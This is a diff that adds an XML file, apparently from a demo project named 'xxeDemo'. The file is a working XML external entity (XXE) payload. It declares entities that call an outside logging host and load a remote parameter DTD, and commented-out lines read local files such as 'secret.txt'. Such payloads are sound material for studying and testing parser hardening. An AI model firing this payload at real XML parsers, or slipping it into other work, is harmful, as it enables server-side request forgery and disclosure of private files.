@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE root [<!ENTITY url SYSTEM "http://httplog.sicnu.tech:8080/httplog/xxe">
+        <!ENTITY % param SYSTEM "http://httplog.sicnu.tech:8080/httplog/param">
+<!--        <!ENTITY % param SYSTEM "file:///Users/momo/IdeaProjects/xxeDemo/src/main/resources/text.txt">-->
+<!--        <!ENTITY data SYSTEM "file:///Users/momo/IdeaProjects/xxeDemo/src/main/resources/secret.txt">-->
+        %param;
+        ]>
+<root>
+    <url>&url;</url>
+<!--    <content>&data;</content>-->
+</root>
